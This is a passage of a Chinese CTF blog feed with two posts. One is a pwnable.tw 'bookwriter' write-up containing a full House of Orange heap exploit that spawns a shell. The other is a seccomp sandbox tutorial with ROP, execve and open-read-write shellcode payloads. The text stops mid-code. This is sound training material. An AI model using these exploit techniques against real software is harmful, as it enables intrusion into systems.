class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./bookwriter&quot;, env = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10304</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bookwriter&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_64.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_choice</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    send_choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of page :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx:<span class="built_in">int</span></span>):</span><br><span class="line">    send_choice(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index of page :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    send_choice(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index of page :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">new_author=<span class="literal">None</span></span>):</span><br><span class="line">    send_choice(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;(yes:1 / no:0)&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> new_author != <span class="literal">None</span>:</span><br><span class="line">        p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Author :&quot;</span>)</span><br><span class="line">        p.send(new_author)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    send_choice(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># const</span></span><br><span class="line">    bss_author = <span class="number">0x602060</span></span><br><span class="line">    bss_catalog = <span class="number">0x6020a0</span></span><br><span class="line">    bss_sizelist = <span class="number">0x6020e0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># set author</span></span><br><span class="line">    author = <span class="string">b&quot;a&quot;</span>*(<span class="number">0x40</span>-<span class="number">0x2</span>) + <span class="string">b&quot;||&quot;</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Author :&quot;</span>)</span><br><span class="line">    p.send(author)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">b&quot;aaa&quot;</span>) </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+<span class="string">b&quot;\xe1\x0f\x00&quot;</span>) </span><br><span class="line">    info()</span><br><span class="line">    add(<span class="number">0x78</span>, <span class="string">b&quot;aaaaaaaa&quot;</span>) </span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content :\naaaaaaaa&quot;</span>)</span><br><span class="line">    libc_leak = u64(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3c4188</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">b&quot;system&quot;</span>]</span><br><span class="line">    stdout = libc_base + <span class="number">0x3c5620</span></span><br><span class="line">    io_list_all = libc_base + libc.symbols[<span class="string">b&quot;_IO_list_all&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_leak:&quot;</span>, <span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stdout:&quot;</span>, <span class="built_in">hex</span>(stdout))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;io_list_all:&quot;</span>, <span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">    send_choice(<span class="number">4</span>) </span><br><span class="line">    p.recvuntil(<span class="string">b&quot;||&quot;</span>)</span><br><span class="line">    heap_leak = u64(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    heap_base = heap_leak - <span class="number">0x10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;heap_leak:&quot;</span>, <span class="built_in">hex</span>(heap_leak))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;(yes:1 / no:0)&quot;</span>, <span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    chunk1_addr = heap_base + <span class="number">0x20</span> </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;chunk1_addr:&quot;</span>, <span class="built_in">hex</span>(chunk1_addr))</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x58</span>, <span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pad = <span class="string">b&quot;a&quot;</span>*<span class="number">0x330</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    data += p64(<span class="number">0x61</span>)</span><br><span class="line">    data += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    data += p64(libc_base + libc.symbols[<span class="string">b&#x27;_IO_list_all&#x27;</span>] - <span class="number">0x10</span>)</span><br><span class="line">    data += p64(<span class="number">2</span>)</span><br><span class="line">    data += p64(<span class="number">3</span>)</span><br><span class="line">    data = data.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    data + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    data = data.ljust(<span class="number">0xe0</span>-<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    vtable = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(libc_base + libc.symbols[<span class="string">b&#x27;system&#x27;</span>])</span><br><span class="line">    vtable_addr = heap_base + <span class="number">0x420</span></span><br><span class="line">    data += p64(vtable_addr)</span><br><span class="line">    data += vtable</span><br><span class="line">    edit(<span class="number">0</span>, pad+data)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    send_choice(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Size of page :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;16&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>然后就打通了 附上构造图表</p><table><thead><tr><th>top</th><th>chunk</th></tr></thead><tbody><tr><td>&#x2F;bin&#x2F;sh\0</td><td>0x61</td></tr><tr><td>随意</td><td>IO_list_all-0x10</td></tr><tr><td>2</td><td>3</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>fffffffffffffff</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>vtable_addr</td></tr><tr><td>vtable(其实这里就是vtable的首地址)</td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><table><thead><tr><th>vtable</th><th>addr</th></tr></thead><tbody><tr><td>0</td><td>0</td></tr><tr><td>0</td><td>system_addr</td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnable-bookwriter&quot;&gt;&lt;a href=&quot;#pwnable-bookwriter&quot; class=&quot;headerlink&quot; title=&quot;pwnable_bookwriter&quot;&gt;&lt;/a&gt;pwnable_bookwriter&lt;/h1&gt;&lt;h2 id=&quot;执</summary>
      
    
    
    
    <category term="2024ROIS冬令营" scheme="http://s1nec-1o.github.io/categories/2024ROIS%E5%86%AC%E4%BB%A4%E8%90%A5/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024-1-26沙盒的学习</title>
    <link href="http://s1nec-1o.github.io/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1nec-1o.github.io/2024/01/27/2024-1-26%E6%B2%99%E7%9B%92%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-01-26T16:02:28.000Z</published>
    <updated>2024-04-28T14:11:09.381Z</updated>
    
    <content type="html"><![CDATA[<h1 id="沙盒"><a href="#沙盒" class="headerlink" title="沙盒"></a>沙盒</h1><h2 id="什么是orw？"><a href="#什么是orw？" class="headerlink" title="什么是orw？"></a>什么是orw？</h2><p>所谓orw就是open read write 打开flag 写入flag 输出flag</p><h2 id="什么是seccomp"><a href="#什么是seccomp" class="headerlink" title="什么是seccomp?"></a>什么是seccomp?</h2><p>seccomp: seccomp是一种内核中的安全机制，正常情况下，程序可以使用所有的syscall,这是不安全的，比如程序劫持程序流后通过execve的syscall来getshell。所以可以通过seccomp_init、seccomp_rule_add、seccomp_load配合 或者prctl来ban掉一些系统调用.</p><p>在实战中我们可以通过 <code>seccomp-tools</code>来查看程序是否启用了沙箱, <code>seccomp-tools</code>工具安装方法如下:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install gcc ruby-dev</span><br><span class="line">$ gem install seccomp-tools</span><br></pre></td></tr></table></figure><p>安装完成后通过 <code>seccomp-tools dump ./pwn</code>即可查看程序沙箱</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">q@ubuntu:~$ seccomp-tools dump ./not</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>怎么读取?</p><p>该规则描述了一个程序的系统调用过滤策略。它的逻辑如下：</p><ol><li>检查架构是否为 x86_64（ARCH_X86_64）。如果不是，跳转到标签 0010。</li><li>获取系统调用号（sys_number）。</li><li>如果系统调用号小于 0x40000000，跳转到标签 0005。</li><li>如果系统调用号不等于 0xffffffff，跳转到标签 0010。</li><li>如果系统调用号是 read，则跳转到标签 0009。</li><li>如果系统调用号是 write，则跳转到标签 0009。</li><li>如果系统调用号是 open，则跳转到标签 0009。</li><li>如果系统调用号不是 exit，则跳转到标签 0010。</li><li>返回允许执行该系统调用。</li><li><strong>返回拒绝执行该系统调用（终止进程）。</strong></li></ol><h2 id="怎么实现沙盒？"><a href="#怎么实现沙盒？" class="headerlink" title="怎么实现沙盒？"></a>怎么实现沙盒？</h2><p>在ctf中常见的实现沙箱的机制有两种，一种是<code>prctl函数调用</code>，另一种就是<code>seccomp库函数</code></p><p>而其一般都会禁用execve函数，使之无法直接getshell</p><p>在严格模式下甚至只支持exit()，sigreturn()，read()和write()的使用，使用其他系统调用都将会杀掉进程</p><h3 id="prctl函数调用"><a href="#prctl函数调用" class="headerlink" title="prctl函数调用"></a>prctl函数调用</h3><p>可以通过第一个参数控制程序进程去做什么，该参数常见得为<code>38</code>和<code>22</code>两种情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><ul><li>第一个参数为38，第二个参数为1时，禁用execve且子进程一样</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br></pre></td></tr></table></figure><ul><li>第一个参数为22</li><li>第二个参数为1时，只允许调用read&#x2F;write&#x2F;_exit(not exit_group)&#x2F;sigreturn这几个syscall</li><li>第二个参数为2时，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则</li></ul><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><p>首先对seccomp进行初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1 = seccomp_init(<span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><ul><li>为0表示白名单模式，为0x7fff0000U则为黑名单模式</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//之后对seccomp添加规则</span></span><br><span class="line">seccomp_rule_add(v1, <span class="number">0x7FFF0000</span>LL, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><ul><li>v1对应上面初始化后返回得值</li><li>0x7fff0000U即黑名单模式</li><li>2对应系统调用号</li><li>0 对应系统调用所限制使用得参数数量，0即不限制</li></ul><p>禁止read函数第一个参数为0的调用的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="type">__int64_t</span> <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">    scmp_filter_ctx v1;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    </span><br><span class="line">    v1 = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(v1==<span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    rc = seccomp_rule_add_exact(v1, SCMP_ACT_ERRNO(EACCES), SCMP_SYS(read), <span class="number">1</span>, SCMP_A0(SCMP_CMP_EQ, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    rc = seccomp_load(v1);</span><br><span class="line">    <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> test;</span><br><span class="line">    test=read(<span class="number">0</span>,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__int64_t</span> result = work();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Result: %ld\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="编写沙箱规则的shellcode"><a href="#编写沙箱规则的shellcode" class="headerlink" title="编写沙箱规则的shellcode"></a>编写沙箱规则的shellcode</h2><p>使用seccomp-tools生成规则，一条规则是8个字节</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat 1.asm</span></span><br><span class="line">A = sys_number</span><br><span class="line">A == 257? e0:next</span><br><span class="line">A == 1? ok:next</span><br><span class="line"><span class="built_in">return</span> ALLOW</span><br><span class="line">e0:</span><br><span class="line"><span class="built_in">return</span> ERRNO(0)</span><br><span class="line">ok:</span><br><span class="line"><span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>规则如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#seccomp-tools asm 1.asm -f raw |seccomp-tools disasm -</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x00000101  <span class="keyword">if</span> (A == openat) goto 0004</span><br><span class="line"> 0002: 0x15 0x02 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0005</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00050000  <span class="built_in">return</span> ERRNO(0)</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>生成16进制字符串</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#seccomp-tools asm 1.asm</span></span><br><span class="line"><span class="string">&quot;x20x00x00x00x00x00x00x00x15x00x02x00x01x01x00x00x15x00x02x00x01x00x00x00x06x00x00x00x00x00xFFx7Fx06x00x00x00x00x00x05x00x06x00x00x00x00x00xFFx7F&quot;</span></span><br></pre></td></tr></table></figure><h1 id="沙盒的绕过"><a href="#沙盒的绕过" class="headerlink" title="沙盒的绕过"></a>沙盒的绕过</h1><p>首先复习寄存器的约定：</p><p>在64位的x86架构中，函数调用时使用的寄存器约定为：</p><ol><li><p>参数寄存器：</p><table><thead><tr><th>参数</th><th>寄存器</th></tr></thead><tbody><tr><td>第一个参数</td><td>RDI</td></tr><tr><td>第二个参数</td><td>RSI</td></tr><tr><td>第三个参数</td><td>RDX</td></tr><tr><td>第四个参数</td><td>RCX</td></tr><tr><td>第五个参数</td><td>R8</td></tr><tr><td>第六个参数</td><td>R9</td></tr></tbody></table><p>浮点参数存储在 <code>XMM0</code> 到 <code>XMM7</code> 寄存器中。</p></li><li><p>返回值寄存器：</p><ul><li>整型返回值存储在寄存器 <code>RAX</code> 中。</li><li>浮点返回值存储在寄存器 <code>XMM0</code> 中。</li></ul></li><li><p>其他寄存器：</p><ul><li>寄存器 <code>RBX</code>、<code>RBP</code>、<code>R12</code>、<code>R13</code>、<code>R14</code>、<code>R15</code> 在函数调用期间被视为被调用者保存寄存器，即在函数调用前后需要保持其值不变。</li><li>寄存器 <code>RSP</code> 用于栈指针。</li></ul></li></ol><h2 id="1-简单栈利用："><a href="#1-简单栈利用：" class="headerlink" title="1.简单栈利用："></a>1.简单栈利用：</h2><p>通过栈溢出控制程序返回流构造rop链依次执行open、read、write函数。</p><p>例题：ciscn2023 烧烤摊</p><p>整数溢出后存在栈溢出，栈溢出后orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">name_addr = <span class="number">0x04E60F0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.orw</span></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00&quot;</span>                                         //name即为flag，name_addr = flag_addr</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(name_addr) + p64(pop_rsi_ret) + p64(r_addr) + p64(fopen64_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(name_addr) + p64(pop_rdx_rbx_ret) + p64(<span class="number">0x30</span>) * <span class="number">2</span> + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(name_addr) + p64(pop_rdx_rbx_ret) + p64(<span class="number">0x30</span>) * <span class="number">2</span> + p64(write_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#若bss段地址可写，可直接写入orw_shellocode</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/ctf/flag.txt&#x27;</span>) + shellcraft.read(<span class="number">3</span>, bss_addr, <span class="number">0x300</span>) + shellcraft.write(<span class="number">1</span>, bss_addr, <span class="number">0x300</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#2.syscall</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="number">0x8</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x08</span> </span><br><span class="line">            + p64(pop_rax_ret) + p64(<span class="number">59</span>) </span><br><span class="line">            + p64(pop_rdi_ret) + p64(name_addr) </span><br><span class="line">            + p64(pop_rsi_ret) + p64(<span class="number">0</span>) </span><br><span class="line">            + p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) </span><br><span class="line">            + p64(syscall_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>NX可以防止攻击者将数据区域（如栈或堆）中的代码作为执行指令</p><h2 id="2-orw-shellcode"><a href="#2-orw-shellcode" class="headerlink" title="2.orw+shellcode:"></a>2.orw+shellcode:</h2><p>针对于NX未开启且禁用execve系统调用的程序，即可以写入shellcode，分两段写入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = shellcode1 + p64(ret_addr) + shellcode2</span><br></pre></td></tr></table></figure><p>第一段写入orw代码,返回地址填入jmp rsp地址，第二段写入控制rsp的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))    //直接调用cat读取</span><br><span class="line"></span><br><span class="line">//或</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;</span></span><br><span 